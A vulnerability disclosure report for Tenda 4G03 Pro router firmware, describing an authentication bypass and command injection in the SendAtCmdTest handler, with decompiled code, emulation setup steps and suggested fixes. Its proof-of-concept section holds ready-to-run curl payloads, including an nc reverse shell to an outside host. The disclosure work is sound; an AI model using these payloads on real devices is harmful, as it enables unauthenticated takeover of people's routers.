## **Vulnerability Report: Command Injection and Authentication Bypass in Tenda 4G03 Pro Firmware**

### **1. Overview**

A command injection vulnerability exists in the `SendAtCmdTest` handler of the HTTP server (`/usr/sbin/httpd`) in Tenda 4G03 Pro firmware version `V04.03.01.56`. An attacker can execute arbitrary system commands remotely. Additionally, an authentication bypass exists by adding `?origin=xxx` to the request URL, allowing access even when a password is set.

### **2. Affected Product**

- **Vendor**: Tenda
- **Product**: 4G03 Pro
- **Firmware Version**: `US_4G03ProV1.0re_V04.03.01.56` (and likely earlier versions)
- **Binary**: `/usr/sbin/httpd` (ARM 32-bit)

### **3. Vulnerability Details**

#### **3.1 Authentication Bypass via `origin=xxx`**

In the authentication function `sub_21A54`, if the request URL contains the string `"origin=xxx"`, the authentication check is skipped.

c

```
if ( strstr(a5, "origin=xxx") )
    return 0;  // Authentication bypass
```



#### **3.2 Command Injection in `/goform/SendAtCmdTest`**

The form handler `sub_268B4` processes POST requests to `/goform/SendAtCmdTest`. The `atCmd` parameter is directly concatenated into a system command executed via `td_common_popen()`.

c

```
v2 = sub_1F104(a1, "atCmd", "ati\r");
if ( !strcmp(v2, "ati") )
    snprintf(v4, 511, "serial_atcmd %s\r", v2);
else
    snprintf(v4, 511, "serial_atcmd at+%s\r", v2);
td_common_popen(v4, v5, 1024);
```



No input sanitization is performed, allowing command injection using shell metacharacters (e.g., `;`).

### **4. Proof of Concept (PoC)**

#### **4.1 No password set (factory default)**

bash

```
curl -X POST http://192.168.0.1/goform/SendAtCmdTest \
     --data "atCmd=; touch /tmp/pwntest;"
```



The file `/tmp/pwntest` is created inside the device’s filesystem, confirming command execution.

#### **4.2 Password set – using `origin=xxx` bypass**

bash

```
curl -X POST "http://192.168.0.1/goform/SendAtCmdTest?origin=xxx" \
     --data "atCmd=ati; touch /tmp/pwntestbbbb;"
```



#### **4.3 Attempted reverse shell (dual connection)**

The following command was tested but the second connection (port 4445) did not establish. The first connection (port 4444) could only be established when both ports were attempted simultaneously.

bash

```
curl -X POST "http://192.168.0.1/goform/SendAtCmdTest" \
     --data "atCmd=ati;/usr/bin/nc 192.168.207.128 4444 | /bin/sh | /usr/bin/nc 192.168.207.128 4445 &"
```



### **5. Impact**

- Unauthenticated remote command execution.
- Attackers can gain full control over the device (arbitrary commands, file manipulation, backdoor installation).
- The `origin=xxx` bypass works even when a password is configured.

### **6. Environment Setup for Analysis**

The following steps were used to set up the emulation environment for dynamic testing:

#### **6.1 Host Network Configuration**

bash

```
sudo ip link add br-lan type dummy
sudo ip addr add 192.168.0.1/24 dev br-lan
sudo ip link set br-lan up
```



#### **6.2 Copy QEMU static binary and mount filesystems**

bash

```
sudo cp /usr/bin/qemu-arm-static ./squashfs-root/usr/bin/

sudo mount -t proc /proc ./squashfs-root/proc
sudo mount -t sysfs /sys ./squashfs-root/sys
sudo mount --bind /dev ./squashfs-root/dev

sudo chroot ./squashfs-root /usr/bin/qemu-arm-static /bin/sh
```



#### **6.3 Inside the chroot environment, start required services**

bash

```
mkfifo /tmp/atcmdni1
chmod 666 /tmp/atcmdni1
mkdir -p /var/run
chmod 1777 /tmp
mkdir -p /tmp/config
./sbin/ubusd &
/usr/sbin/httpd -p 80 &
```



The web service is then accessible at `http://192.168.0.1:80`.

### **7. CVSS 3.1 Score**

- **Base Score**: 9.8 (Critical)
- **Vector**: `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`

### **8. Suggested Fixes**

- Remove or strictly validate the `origin=xxx` bypass mechanism.
- Sanitize user input in the `atCmd` parameter – reject shell metacharacters or use a whitelist.
- Enforce authentication for all `/goform/` endpoints by default.

### **9. References**

- Vendor firmware download page: https://www.tendacn.com/material/show/797512473055301
- Analysed firmware: `US_4G03ProV1.0re_V04.03.01.56_multi_TDE01.bin`